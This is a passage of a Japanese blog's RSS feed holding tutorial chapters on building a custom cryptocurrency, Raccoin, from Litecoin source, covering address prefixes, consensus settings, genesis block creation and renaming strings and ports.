&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;上記のURLを確認すると、48を指定すれば1文字目が必ず&amp;quot;L&amp;quot;で始まることがわかります。&lt;/p&gt;
&lt;h2 id=&#34;アドレスプレフィックスを決めるpubkey_address&#34;&gt;アドレスプレフィックスを決める(PUBKEY_ADDRESS)&lt;/h2&gt;
&lt;p&gt;今回作成する仮想通貨名称はRaccoinで、接頭辞がRなのでアドレスもRから始まるように変更します。&lt;br&gt;
上記URLを参考にすると60か61を指定すれば必ず R から始まるようなので、60 を指定します。&lt;/p&gt;
&lt;h2 id=&#34;p2sh-用のアドレスプレフィックスを決めるscript_address&#34;&gt;P2SH 用のアドレスプレフィックスを決める(SCRIPT_ADDRESS)&lt;/h2&gt;
&lt;p&gt;Litecoin 0.16 は P2SH にも対応しています。&lt;br&gt;
P2SH はより汎用的なデータを定義できる方式で、メジャーな例ではマルチシグに利用されたりしています。&lt;br&gt;
P2SH 用のプレフィックスは BIP-13 で 5 にする(3から始まる)よう決められていますから、何も変えないようにしましょう。&lt;/p&gt;
&lt;h2 id=&#34;p2sh-ベースの-segwit-用アドレスプレフィックスを決める-script_address2&#34;&gt;P2SH ベースの Segwit 用アドレスプレフィックスを決める (SCRIPT_ADDRESS2)&lt;/h2&gt;
&lt;p&gt;Litecoin 0.16 は Segwit にも対応しています。(というかそのために0.16を使いました)&lt;br&gt;
ただ Segwit は新しい機能であるため、Segwit アドレスの形式に対応していないウォレットがあります。&lt;br&gt;
そのため、P2SH に対応した Segwit 用のアドレスプレフィックスを上記のURLを参考にして設定します。&lt;br&gt;
今回は S から始めることにしたので、 63 を指定します。&lt;/p&gt;
&lt;h2 id=&#34;ネイティブ-segwit-用のアドレスプレフィックスを決めるbech32&#34;&gt;ネイティブ Segwit 用のアドレスプレフィックスを決める(bech32)&lt;/h2&gt;
&lt;p&gt;こちらは完全に Segwit に対応したウォレット同士で利用するためのアドレスプレフィックスです。&lt;br&gt;
Litecoin の Segwit 用のアドレスプレフィックスは3文字で、&amp;ldquo;ltc&amp;quot;です。&lt;br&gt;
この値は割と好きに決めてよさそうですが、今後作成するウォレットのバリデータにあまり手を加えたくないため、同じく3文字で設定することにします。&lt;br&gt;
今回は Raccoin から3文字とって、&amp;ldquo;xri&amp;rdquo; にします。&lt;br&gt;
・・・が、実はこの変更は「単純な文字列置換」章の「小文字略称の書き換え」で既に行っているのでこの項目での置き換えは不要です。&lt;/p&gt;
&lt;h2 id=&#34;testnetregtest-用のアドレスプレフィックス&#34;&gt;Testnet/Regtest 用のアドレスプレフィックス&lt;/h2&gt;
&lt;p&gt;今まで決めてきたのは Mainnet 用のアドレスプレフィックスであり、テスト用のネットワークであるTestnetとRegtestのアドレスプレフィックスも決めないといけません。&lt;br&gt;
ただこれらは本番環境では使わないのでカジュアルに決めていきましょう。&lt;/p&gt;
&lt;h3 id=&#34;testnet&#34;&gt;Testnet&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;アドレスプレフィックス(PUBKEY_ADDRESS)&lt;br&gt;
一般的に、Mainnetのプレフィックスを小文字に変えるようです。&lt;br&gt;
今回は&amp;quot;r&amp;quot;から始めたいので、122 を指定します。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;P2SH 用のアドレスプレフィックス(SCRIPT_ADDRESS)&lt;br&gt;
こちらもBIP13で196を指定（2から始まる）されているので、変更しません。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;P2SH ベースの Segwit 用アドレスプレフィックス (SCRIPT_ADDRESS2)&lt;br&gt;
今回は&amp;quot;s&amp;quot;から始めるようにするので、 125 にします。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ネイティブ Segwit 用のアドレスプレフィックス(bech32)
一般的に、Mainnetのアドレスプレフィックスの最初に&amp;quot;t&amp;quot;を付与する形にするようです。&lt;br&gt;
なので今回は&amp;quot;txri&amp;quot;にします。&lt;br&gt;
・・・が、実はこの変更は「単純な文字列置換」章の「小文字略称の書き換え」で既に行っているのでこの項目での置き換えは不要です。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;regtest&#34;&gt;Regtest&lt;/h3&gt;
&lt;p&gt;PUBKEY_ADDRESS、SCIPRT_ADDRESS、SCRIPT_ADDRESS2 ともにTestnetと同様でよいです。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ネイティブ Segwit 用のアドレスプレフィックス(bech32)&lt;br&gt;
一般的に、Mainnetのアドレスプレフィックスの最初に&amp;quot;r&amp;quot;を付与する形にするようです。&lt;br&gt;
なので今回は&amp;quot;rxri&amp;quot;にします。&lt;br&gt;
・・・が、実はこの変更は「単純な文字列置換」章の「小文字略称の書き換え」で既に行っているのでこの項目での置き換えは不要です。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;ソースコードの変更作業&#34;&gt;ソースコードの変更作業&lt;/h1&gt;
&lt;h2 id=&#34;cmainparams&#34;&gt;CMainParams()&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;base58Prefixes[PUBKEY_ADDRESS] = std::vector&amp;lt;unsigned char&amp;gt;(1,60);
base58Prefixes[SCRIPT_ADDRESS] = std::vector&amp;lt;unsigned char&amp;gt;(1,5);
base58Prefixes[SCRIPT_ADDRESS2] = std::vector&amp;lt;unsigned char&amp;gt;(1,63);  
base58Prefixes[SECRET_KEY] =     std::vector&amp;lt;unsigned char&amp;gt;(1,188);

bech32_hrp = &amp;#34;xri&amp;#34;;
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;アドレスは「R」 から始まるようにしました。&lt;/li&gt;
&lt;li&gt;マルチシグアドレスは「S」から始まるようにしました。&lt;/li&gt;
&lt;li&gt;SECRET_KEY は PUBKEY_ADDRESS + 128 にするようなので、今回は 188 にしました。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;ctestnetparams&#34;&gt;CTestNetParams()&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;base58Prefixes[PUBKEY_ADDRESS] = std::vector&amp;lt;unsigned char&amp;gt;(1,122);
base58Prefixes[SCRIPT_ADDRESS] = std::vector&amp;lt;unsigned char&amp;gt;(1,196);
base58Prefixes[SCRIPT_ADDRESS2] = std::vector&amp;lt;unsigned char&amp;gt;(1,125);  
base58Prefixes[SECRET_KEY] =     std::vector&amp;lt;unsigned char&amp;gt;(1,254);

bech32_hrp = &amp;#34;txri&amp;#34;;
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;アドレスは「r」 から始まるようにしました。&lt;/li&gt;
&lt;li&gt;マルチシグアドレスは「s」から始まるようにしました。&lt;/li&gt;
&lt;li&gt;SECRET_KEY は PUBKEY_ADDRESS + 128 にするようですが、それだと255を超えてしまうので254にしました。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;cregtestparams&#34;&gt;CRegTestParams()&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;base58Prefixes[PUBKEY_ADDRESS] = std::vector&amp;lt;unsigned char&amp;gt;(1,122);
base58Prefixes[SCRIPT_ADDRESS] = std::vector&amp;lt;unsigned char&amp;gt;(1,196);
base58Prefixes[SCRIPT_ADDRESS2] = std::vector&amp;lt;unsigned char&amp;gt;(1,125);  
base58Prefixes[SECRET_KEY] =     std::vector&amp;lt;unsigned char&amp;gt;(1,254);

bech32_hrp = &amp;#34;rxri&amp;#34;;
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;アドレスは「r」 から始まるようにしました。&lt;/li&gt;
&lt;li&gt;マルチシグアドレスは「s」から始まるようにしました。&lt;/li&gt;
&lt;li&gt;SECRET_KEY は PUBKEY_ADDRESS + 128 にするようですが、それだと255を超えてしまうので254にしました。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;本章ではアドレスのプレフィックスの説明と変更をしました。&lt;br&gt;
次の章でやっとchainparams.cppの変更は終わりで、もうすぐで完成です。&lt;/p&gt;
</description>
      <image>
        <url>https://www.shutingrz.com/cover.png</url>
        <title>自作仮想通貨入門(8) - アドレスのプレフィックス変更</title>
        <link>https://www.shutingrz.com/post/oreore-coin8/</link>
      </image>
    </item>
    
    
    

    
    <item>
      <title>自作仮想通貨入門(7) - コンセンサスの設定</title>
      <link>https://www.shutingrz.com/post/oreore-coin7/</link>
      <pubDate>Mon, 29 Apr 2019 00:17:41 +0900</pubDate>
      
      <guid>https://www.shutingrz.com/post/oreore-coin7/</guid>
      <description>&lt;p&gt;※この章では src/chainparams.cpp を変更します。&lt;/p&gt;
&lt;p&gt;ジェネシスブロックに続いて、今回はコンセンサスも決めていきます。
実はここはデフォルトのままでも問題ないのですが、一応軽く説明します。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;コンセンサスについて&#34;&gt;コンセンサスについて&lt;/h1&gt;
&lt;p&gt;chainparams.cpp には Mainnet, Testnet, Regtest それぞれでconsensusというコンセンサスに関わる変数が存在します。&lt;br&gt;
コンセンサスには色々な設定項目がありますが、この章では実際の仮想通貨の運営で重要な設定項目のみ説明をします。&lt;br&gt;
※コンセンサスには非常に沢山の設設定項目があり、1から説明するとそれだけで長文になってしまうのでここでは省きました。&lt;/p&gt;
&lt;h3 id=&#34;採掘難易度difficulty-を見直す間隔npowtargettimespan&#34;&gt;採掘難易度/Difficulty を見直す間隔(nPowTargetTimespan)/&lt;/h3&gt;
&lt;p&gt;単位は秒。&lt;/p&gt;
&lt;p&gt;長いとマイニングが安定しますが、一度確定すると実際のハッシュレートにそぐわない難易度で続き、難易度が高くなるとブロックが生成されにくくなる時間が増え、難易度が下がるとブロックが生成されやすくなるためPoWの弱点を悪用した攻撃の影響を受けやすくなります。
短いと実際のハッシュレートがリアルタイムで反映されるようになりますが、ハッシュレートが一時的に上昇すると難易度もすぐに上昇し、マイニングが不安定になります。&lt;/p&gt;
&lt;p&gt;bitcoinは2週間、Litecoinは3.5日、Monacoinは1.1日です。
ハッシュレートが高い仮想通貨のほうが長くする傾向にあるようです。&lt;/p&gt;
&lt;h3 id=&#34;ブロック生成間隔npowtargetspacing&#34;&gt;ブロック生成間隔(nPowTargetSpacing)&lt;/h3&gt;
&lt;p&gt;単位は秒。&lt;/p&gt;
&lt;p&gt;長いと確定したブロックが不変になりやすく安定する一方、ブロックが生成されにくくなりトランザクションの流通が阻害されます。
短いとトランザクションの流通が盛んになる一方、ブロックの生成が容易になります。
これによりnPowTargetTimespanとハッシュレート、ノードの規模との兼ね合いでBlock Withholding AttackなどPoWの弱点を悪用した攻撃の影響を受けやすくなります。
Block Withholding Attack はモナコインが受けた攻撃ですね。&lt;/p&gt;
&lt;h3 id=&#34;新ルールのアクティベートの閾値計測期間nminerconfirmationwindow&#34;&gt;新ルールのアクティベートの閾値計測期間(nMinerConfirmationWindow)&lt;/h3&gt;
&lt;p&gt;単位はブロック数。&lt;/p&gt;
&lt;p&gt;BIP9で定められた、ソフトフォークのアクティベーション方法に関する変数です。
ソフトフォークによって新しいルールに対応したシグナルをどのブロック数計測するかをここで定めます。&lt;/p&gt;
&lt;h3 id=&#34;新ルールのアクティベートを行うための計測期間あたりの対応率nrulechangeactivationthreshold&#34;&gt;新ルールのアクティベートを行うための計測期間あたりの対応率(nRuleChangeActivationThreshold)&lt;/h3&gt;
&lt;p&gt;単位はブロック数。 新しいルールが、上記のnMinerConfirmationWindowのうちどれくらいのブロック数で対応していればそのルールが有効になるかを示す変数。
bitcoinはnMinerConfirmationWindowの95%にあたるブロック数が設定されており、Litecoinは75%になっています。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;ソースコードの変更作業&#34;&gt;ソースコードの変更作業&lt;/h1&gt;
&lt;p&gt;本当に流通を考えない限り、ここは特に変えなくても問題ありません。&lt;br&gt;
ただし、実験用途で利用するなら自分だけしかノードがいないので、円滑な実験のためにTestnet/Regtestはうんと数を小さくしておいたほうがいいです。&lt;br&gt;
私はTestnet/Regtestのコンセンサスを以下にしました。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;nPowTargetTimespan: 5 * 30&lt;/li&gt;
&lt;li&gt;nPowTargetSpacing: 30&lt;/li&gt;
&lt;li&gt;nMinerConfirmationWindow: 10&lt;/li&gt;
&lt;li&gt;nRuleChangeActivationThreshold: 7&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;コンセンサスの設定は以上です。&lt;br&gt;
次の章では仮想通貨の華である、ウォレットアドレスのプレフィックスを設定します。&lt;/p&gt;
</description>
      <image>
        <url>https://www.shutingrz.com/cover.png</url>
        <title>自作仮想通貨入門(7) - コンセンサスの設定</title>
        <link>https://www.shutingrz.com/post/oreore-coin7/</link>
      </image>
    </item>
    
    
    

    
    <item>
      <title>自作仮想通貨入門(6) - ジェネシスブロックの作成と設定</title>
      <link>https://www.shutingrz.com/post/oreore-coin6/</link>
      <pubDate>Sun, 28 Apr 2019 23:47:48 +0900</pubDate>
      
      <guid>https://www.shutingrz.com/post/oreore-coin6/</guid>
      <description>&lt;p&gt;※この章では src/chainparams.cpp を変更します。&lt;/p&gt;
&lt;p&gt;仮想通貨はブロックチェーンの原理を基にして運用されています。&lt;br&gt;
つまり、ブロックチェーンを利用するためにはブロックチェーンの一番初めに位置するブロック、&lt;br&gt;
すなわちジェネシス（起源）ブロックを作成する必要があります。&lt;/p&gt;
&lt;h1 id=&#34;ジェネシスブロックgenesisの構造&#34;&gt;ジェネシスブロック(genesis)の構造&lt;/h1&gt;
&lt;p&gt;ジェネシスブロックは以下の構造になっています。&lt;br&gt;
(括弧内はchainparams.cppでの変数名をあらわしています)&lt;/p&gt;
&lt;h3 id=&#34;ブロック生成時刻ntime&#34;&gt;ブロック生成時刻(nTime)&lt;/h3&gt;
&lt;p&gt;ブロックを生成した時刻を記載&lt;br&gt;
ジェネシスブロックの場合は起点としたい時刻を指定する&lt;br&gt;
(後述する、スクリプトに記載する時刻と乖離しないように)&lt;/p&gt;
&lt;h3 id=&#34;採掘難易度difficultynbits&#34;&gt;採掘難易度/Difficulty(nBits)&lt;/h3&gt;
&lt;p&gt;※実装では整数ではなく、係数部・指数部の形で表現します。&lt;br&gt;
※詳しくはbitcoinのページ参照。(&lt;a href=&#34;https://bitcoin.org/en/developer-reference#target-nbits&#34;&gt;https://bitcoin.org/en/developer-reference#target-nbits&lt;/a&gt;)&lt;br&gt;
ジェネシスブロックはその仮想通貨で定めた最小採掘難易度でマイニングします。&lt;br&gt;
その最小難易度は同じくchainparams.cppにある consensus.powLimit で定められています。&lt;br&gt;
Litecoin の powLimitは「&amp;ldquo;00000fffffffffffffffffffffffffffffffffffffffffffffffffffffffffff&amp;rdquo;」を指定しており、&lt;br&gt;
これを係数部・指数部のnBitsで表現すると「0x1d00ffff」となります。&lt;br&gt;
powLimitを変更しないなら、「0x1d00ffff」を指定してください。&lt;/p&gt;
&lt;h3 id=&#34;ブロックバージョンnversion&#34;&gt;ブロックバージョン(nVersion)&lt;/h3&gt;
&lt;p&gt;ブロックのバージョン。ブロック構造が変わらない限り数値は変化しません。&lt;br&gt;
ジェネシスブロックは通常1を指定します。&lt;/p&gt;
&lt;h3 id=&#34;前のブロックのハッシュhashprevblock&#34;&gt;前のブロックのハッシュ(hashPrevBlock)&lt;/h3&gt;
&lt;p&gt;ジェネシスブロックは起源となるのでこれは存在しません。(nullがセットされる)&lt;/p&gt;
&lt;h3 id=&#34;merkle-root-hashmerkleroot&#34;&gt;Merkle Root (hashMerkleRoot)&lt;/h3&gt;
&lt;p&gt;トランザクションのハッシュ木（Merkle Tree）の頂点のハッシュ値。&lt;br&gt;
ジェネシスブロックは一般的にトランザクションは1つだけなので、&lt;br&gt;
結果的には自分で生成するトランザクションのハッシュ値になります。&lt;br&gt;
→「SHA256(SHA256(genesis_tx))」&lt;/p&gt;
&lt;h3 id=&#34;nonce-nnonce&#34;&gt;nonce (nNonce)&lt;/h3&gt;
&lt;p&gt;PoWを示すための値。&lt;br&gt;
この値を変えながらブロックヘッダのハッシュをnBitsよりも小さい値にします。&lt;/p&gt;
&lt;h3 id=&#34;トランザクション-txnew&#34;&gt;トランザクション (txNew)&lt;/h3&gt;
&lt;p&gt;ジェネシスブロックはトランザクションは1つのみ。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;トランザクションバージョン (nVersion)&lt;br&gt;
トランザクションのバージョン。トランザクション構造が変わらない限り数値は変化しません。&lt;br&gt;
ジェネシスブロックは通常1を指定。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;インプット (scriptSig)&lt;br&gt;
これは最初のトランザクションであり、送金などのインプットはありません。 
こういったトランザクションのことをCoinBaseと呼びます。&lt;br&gt;
参照: &lt;a href=&#34;http://learnmeabitcoin.com/glossary/coinbase-transaction&#34;&gt;http://learnmeabitcoin.com/glossary/coinbase-transaction&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;トランザクション生成時刻を示すフィールド (pszTimestamp)&lt;br&gt;
大体の仮想通貨は、その日のニュース記事をそのまま転載して、その日以前に仮想通貨が存在しなかったことを証明することが多いです。&lt;br&gt;
（これによって開発者が採掘をしていないことを示したい？）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ブロック作成報酬 (nValue)&lt;br&gt;
src/validation.cpp の GetBlockSubsidy() で定める値にします。&lt;br&gt;
この値はデフォルトで 50 なので、50 を指定してください。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;アウトプット  (scriptPubKey)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;送信先アドレス (genesisOutputScript)&lt;br&gt;
ジェネシスブロックでは適当に作成した秘密鍵から公開鍵を生成します。&lt;br&gt;
この送信先アドレスは初期開発者が作成するものですが、一般的に開発者個人はこのアドレスを利用していないようです。&lt;br&gt;
(blockchain explorerでジェネシスブロックのscriptPubkeyを参照してみてください。)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;以上の情報をもとに、ジェネシスブロックの作成に必要な変数を代入していきます。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;ジェネシスブロック作成に必要なパラメータを決める&#34;&gt;ジェネシスブロック作成に必要なパラメータを決める&lt;/h1&gt;
&lt;h2 id=&#34;pubkeyの生成&#34;&gt;PubKeyの生成&lt;/h2&gt;
&lt;p&gt;opensslコマンドを使って楕円曲線暗号(secp256k1)から秘密鍵とその証明書を生成します。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ openssl ecparam -genkey -name secp256k1 -rand /dev/urandom -out private_key
$ openssl ec -in private_key -pubout -outform DER|tail -c 65|xxd -p -c 65 &amp;gt; pubkey.hex
$ cat pubkey.hex
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;=&amp;gt; 今回は「043aca3e996c24f8c2453d02532471107e75d219cd09c18a6d574e69338d79e3bbe288330f7b299032f44735162aec272713aacecceacf25855945fe5003309e94」が生成されました。&lt;/p&gt;
&lt;h2 id=&#34;psztimestamp-の作成&#34;&gt;pszTimestamp の作成&lt;/h2&gt;
&lt;p&gt;sciptSig の仕様上、20 - 100 byteの範囲で作成してください。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;kobe-np 11/Jul/2018 Zenkoku hatsu, keisatsu ga kasou tsuka 5000 yen soutou wo sashi osae
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;2018/07/11 の神戸新聞のニュースから引っ張ってきました。&lt;br&gt;
「全国初、警察が仮想通貨５千円相当を差し押さえ」&lt;/p&gt;
&lt;h2 id=&#34;ntime-の指定&#34;&gt;nTime の指定&lt;/h2&gt;
&lt;p&gt;上のpszTimestampの記事の時間と大きくずれない適当なunixtimeを指定してください。&lt;br&gt;
今回は 2018/7/11 21:00:00 の「1531310400」にします。&lt;/p&gt;
&lt;h2 id=&#34;nnonce&#34;&gt;nNonce&lt;/h2&gt;
&lt;p&gt;ここでいうnonceは、PoWを満たすnonceのことではなく、PoWを満たすnonceを探すにあたって、どのnonceの値から始めるかをしめすものです。&lt;br&gt;
ジェネシスブロックの採掘時、このnonceを基準として1ずつインクリメントされます。&lt;br&gt;
今回は適当に「634556435」にします。&lt;/p&gt;
&lt;h2 id=&#34;nbits&#34;&gt;nBits&lt;/h2&gt;
&lt;p&gt;採掘難易度をビット表記したものです。&lt;br&gt;
「0x1e0ffff0」にします。&lt;/p&gt;
&lt;h1 id=&#34;ジェネシスブロックの作成&#34;&gt;ジェネシスブロックの作成&lt;/h1&gt;
&lt;p&gt;今回は様々なアルゴリズムのブロックを生成できる「GenesisH0」を用いてジェネシスブロックを作成します。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/lhartikk/GenesisH0&#34;&gt;https://github.com/lhartikk/GenesisH0&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;mainnettestnetのジェネシスブロック&#34;&gt;Mainnet/Testnetのジェネシスブロック&lt;/h2&gt;
&lt;p&gt;-z に pszTimestamp、 -p に PubKey、 -t に nTime、 -n に nNonce、 -b に nBits を指定します。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;python2.7 genesis.py -a scrypt -z &amp;#34;kobe-np 11/Jul/2018 Zenkoku hatsu, keisatsu ga kasou tsuka 5000 yen soutou wo sashi osae&amp;#34; -p &amp;#34;043aca3e996c24f8c2453d02532471107e75d219cd09c18a6d574e69338d79e3bbe288330f7b299032f44735162aec272713aacecceacf25855945fe5003309e94&amp;#34; -t 1531310400 -n 634556435 -b 0x1e0ffff0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;しばらく（スペックによりますが10分以内には）待つと、ジェネシスブロックとなるnonceが見つかります。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;genesis hash found!
nonce: 634696322
genesis hash: 2f7c64e8e13a55a4f4fe11fd8cc0e5a59b8d59ade336501f17f8ef0c30b93f8c
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Mainnet/TestnetのnNonceには 634696322 を指定すればいいとわかりますね。&lt;/p&gt;
&lt;h2 id=&#34;regtestのジェネシスブロック&#34;&gt;Regtestのジェネシスブロック&lt;/h2&gt;
&lt;p&gt;Regtestはちゃんとマイニングできるかテストするモードなので、採掘難易度を最小にしてジェネシスブロックを作成します。&lt;br&gt;
採掘難易度を示すnBitsの値は「0x207fffff」にします。&lt;br&gt;
また、Litecoinは探すnNonceを0からにしているので、こちらも0から始めるようにしましょう。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;python2.7 genesis.py -a scrypt -z &amp;#34;kobe-np 11/Jul/2018 Zenkoku hatsu, keisatsu ga kasou tsuka 5000 yen soutou wo sashi osae&amp;#34; -p &amp;#34;043aca3e996c24f8c2453d02532471107e75d219cd09c18a6d574e69338d79e3bbe288330f7b299032f44735162aec272713aacecceacf25855945fe5003309e94&amp;#34; -t 1531310400 -n 0 -b 0x207fffff
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;採掘難易度が最小なので、一回目の試行で見つかります。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;genesis hash found!
nonce: 1
genesis hash: 967aaa62c5210edfca1dad7dcf37259f57472326515dbd4654c1705b5395c713
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;RegtestのnNonceは1でいいことがわかります。&lt;/p&gt;
&lt;h1 id=&#34;ソースコードの変更作業&#34;&gt;ソースコードの変更作業&lt;/h1&gt;
&lt;p&gt;ジェネシスブロックを作成しソースコードに記載する情報が集まったため、&lt;br&gt;
今までの情報を使って src/chainparams.cpp を変更します。&lt;/p&gt;
&lt;h2 id=&#34;creategenesisblock&#34;&gt;CreateGenesisBlock()&lt;/h2&gt;
&lt;p&gt;この関数はオーバーロードされており同名で2つの関数がありますが、pszTimestampが定数で定義されている方を書き換えます。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;const char* pszTimestamp = &amp;#34;[上で作ったpszTimestampの値]&amp;#34;;
const CScript genesisOutputScript = CScript() &amp;lt;&amp;lt; ParseHex(&amp;#34;[Pubkeyの値]&amp;#34;) &amp;lt;&amp;lt; OP_CHECKSIG;
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;cmainparams---ctestnetparams--cregtestparams&#34;&gt;CMainParams() /  CTestNetParams() / CRegTestParams()&lt;/h2&gt;
&lt;p&gt;上で決めた nTime、nNonce、nBits を入れていきます。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;genesis = CreateGenesisBlock([nTime], [ジェネシスブロック作成時に見つけたnonce], [ジェネシスブロック作成時に指定したnBits], 1, 50 * COIN);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ジェネシスブロックに関する記載は以上で終了です。&lt;br&gt;
chainparams.cpp は他にも色々変える必要があるので、次の章も引き続きやっていきます。&lt;/p&gt;
</description>
      <image>
        <url>https://www.shutingrz.com/cover.png</url>
        <title>自作仮想通貨入門(6) - ジェネシスブロックの作成と設定</title>
        <link>https://www.shutingrz.com/post/oreore-coin6/</link>
      </image>
    </item>
    
    
    

    
    <item>
      <title>自作仮想通貨入門(5) - 単純な文字列置換</title>
      <link>https://www.shutingrz.com/post/oreore-coin5/</link>
      <pubDate>Sun, 28 Apr 2019 23:17:11 +0900</pubDate>
      
      <guid>https://www.shutingrz.com/post/oreore-coin5/</guid>
      <description>&lt;p&gt;この章からいよいよLitecoinのソースコードに修正を加えていきます。&lt;/p&gt;
&lt;p&gt;この章ではソースコードおよび関連ドキュメントに含まれるLitecoin関連の文字列を自作仮想通貨の通貨名に変更します。&lt;br&gt;
この時点でLitecoinのどの名称を自分の仮想通貨の名称に変えるかを決めておきましょう。&lt;br&gt;
また、待ち受けるサーバのポート番号についてもこの章で変更するので、ポート番号についても決めていきます。&lt;br&gt;
ノード待受ポート番号については有名どころの仮想通貨およびその他サーバと被らないように設定しましょう。&lt;br&gt;
RPC接続の待受ポート番号は一般的に自分自身で使うためものでありconfで変えられるので、最悪他の仮想通貨と被っても大丈夫です。&lt;/p&gt;
&lt;p&gt;下記にLitecoinとRaccoinの比較表を記載しているので、Raccoinの表記を自分の仮想通貨の表記に置き換えて作業をしてください。&lt;/p&gt;
&lt;h2 id=&#34;litecoinとraccoinの名称比較表&#34;&gt;LitecoinとRaccoinの名称比較表&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;Litecoin&lt;/th&gt;
&lt;th&gt;Raccoin&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;正式名称&lt;/td&gt;
&lt;td&gt;Litecoin&lt;/td&gt;
&lt;td&gt;Raccoin&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;大文字名称&lt;/td&gt;
&lt;td&gt;LITECOIN&lt;/td&gt;
&lt;td&gt;RACCOIN&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;大文字略称&lt;/td&gt;
&lt;td&gt;LTC&lt;/td&gt;
&lt;td&gt;XRI&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;小文字名称&lt;/td&gt;
&lt;td&gt;litecoin&lt;/td&gt;
&lt;td&gt;raccoin&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;小文字略称&lt;/td&gt;
&lt;td&gt;ltc&lt;/td&gt;
&lt;td&gt;xri&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;1000分の1コイン&lt;/td&gt;
&lt;td&gt;lites&lt;/td&gt;
&lt;td&gt;mXRI&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;100万分の1コイン&lt;/td&gt;
&lt;td&gt;photon&lt;/td&gt;
&lt;td&gt;uXRI&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;litecoinとraccoinのp2p待受ポート番号比較表&#34;&gt;LitecoinとRaccoinのP2P待受ポート番号比較表&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;Litecoin&lt;/th&gt;
&lt;th&gt;Raccoin&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Mainnet&lt;/td&gt;
&lt;td&gt;9333/tcp&lt;/td&gt;
&lt;td&gt;8883/tcp&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Testnet&lt;/td&gt;
&lt;td&gt;19335/tcp&lt;/td&gt;
&lt;td&gt;19883/tcp&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Regtest&lt;/td&gt;
&lt;td&gt;19444/tcp&lt;/td&gt;
&lt;td&gt;20888/tcp&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;litecoinとraccinのrpcポート番号比較表&#34;&gt;LitecoinとRaccinのRPCポート番号比較表&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
